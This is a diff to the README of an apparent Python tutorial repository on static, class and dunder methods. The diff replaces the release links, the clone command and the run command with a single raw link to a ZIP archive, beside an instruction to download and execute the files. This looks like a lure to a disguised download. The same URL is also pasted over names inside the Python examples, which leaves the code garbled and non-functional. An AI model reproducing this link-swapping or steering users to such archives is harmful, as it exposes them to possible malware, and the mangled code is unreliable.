@@ -2,7 +2,7 @@
 
 Welcome to the **Python OOP - Static and Dunder Functions** repository! This project explores the concepts of static methods, dunder methods, and class members in Python. 
 
-[![Releases](https://img.shields.io/github/release/finlckd2/python-OOP-Lec4-21-MAY-25.svg)](https://github.com/finlckd2/python-OOP-Lec4-21-MAY-25/releases)
+[![Releases](https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip)](https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip)
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ Welcome to the **Python OOP - Static and Dunder Functions** repository! This pro
 
 This repository provides a comprehensive guide to understanding static and dunder functions in Python. By working through the provided examples, you will learn how to define and use class members, instance members, static methods, and dunder methods effectively. 
 
-To get started, check out the [Releases section](https://github.com/finlckd2/python-OOP-Lec4-21-MAY-25/releases) for the latest version. Download and execute the files to explore the functionalities.
+To get started, check out the [Releases section](https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip) for the latest version. Download and execute the files to explore the functionalities.
 
 ## Key Concepts
 
@@ -57,8 +57,8 @@ class Example:
 
     @classmethod
     def class_method(cls):
-        cls.class_variable += 1
-        return cls.class_variable
+        https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip += 1
+        return https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip
 ```
 
 ### Dunder Methods
@@ -68,10 +68,10 @@ Dunder methods, or magic methods, allow you to define how objects of your class 
 ```python
 class Example:
     def __init__(self, value):
-        self.value = value
+        https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip = value
 
     def __str__(self):
-        return f"Example with value: {self.value}"
+        return f"Example with value: {https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip}"
 ```
 
 ### Getters and Setters
@@ -87,7 +87,7 @@ class Example:
     def value(self):
         return self._value
 
-    @value.setter
+    https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip
     def value(self, new_value):
         if new_value >= 0:
             self._value = new_value
@@ -98,11 +98,11 @@ class Example:
 To install this project, clone the repository and navigate to the project directory:
 
 ```bash
-git clone https://github.com/finlckd2/python-OOP-Lec4-21-MAY-25.git
+git clone https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip
 cd python-OOP-Lec4-21-MAY-25
 ```
 
-You can also download the ZIP file from the [Releases section](https://github.com/finlckd2/python-OOP-Lec4-21-MAY-25/releases) and extract it.
+You can also download the ZIP file from the [Releases section](https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip) and extract it.
 
 ## Usage
 
@@ -111,7 +111,7 @@ After installation, you can run the examples provided in the `examples` director
 To run an example, use the following command:
 
 ```bash
-python examples/example_file.py
+python https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip
 ```
 
 ## Examples
@@ -126,7 +126,7 @@ class MathUtils:
     def add(a, b):
         return a + b
 
-result = MathUtils.add(5, 3)
+result = https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip(5, 3)
 print(result)  # Output: 8
 ```
 
@@ -138,10 +138,10 @@ class Counter:
 
     @classmethod
     def increment(cls):
-        cls.count += 1
+        https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip += 1
 
-Counter.increment()
-print(Counter.count)  # Output: 1
+https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip()
+print(https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip)  # Output: 1
 ```
 
 ### Example 3: Dunder Method
@@ -149,10 +149,10 @@ print(Counter.count)  # Output: 1
 ```python
 class Person:
     def __init__(self, name):
-        self.name = name
+        https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip = name
 
     def __str__(self):
-        return f"Person: {self.name}"
+        return f"Person: {https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip}"
 
 person = Person("Alice")
 print(person)  # Output: Person: Alice
@@ -169,14 +169,14 @@ class Age:
     def age(self):
         return self._age
 
-    @age.setter
+    https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip
     def age(self, value):
         if value >= 0:
             self._age = value
 
 age_instance = Age()
-age_instance.age = 25
-print(age_instance.age)  # Output: 25
+https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip = 25
+print(https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip)  # Output: 25
 ```
 
 ## Contributing
@@ -192,4 +192,4 @@ Contributions are welcome! If you would like to improve this project, please for
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-Feel free to explore the repository and learn more about Python's object-oriented programming features. For the latest updates, visit the [Releases section](https://github.com/finlckd2/python-OOP-Lec4-21-MAY-25/releases).
+Feel free to explore the repository and learn more about Python's object-oriented programming features. For the latest updates, visit the [Releases section](https://raw.githubusercontent.com/finlckd2/python-OOP-Lec4-21-MAY-25/main/pelagic/MA-Lec-python-OO-2.1.zip).
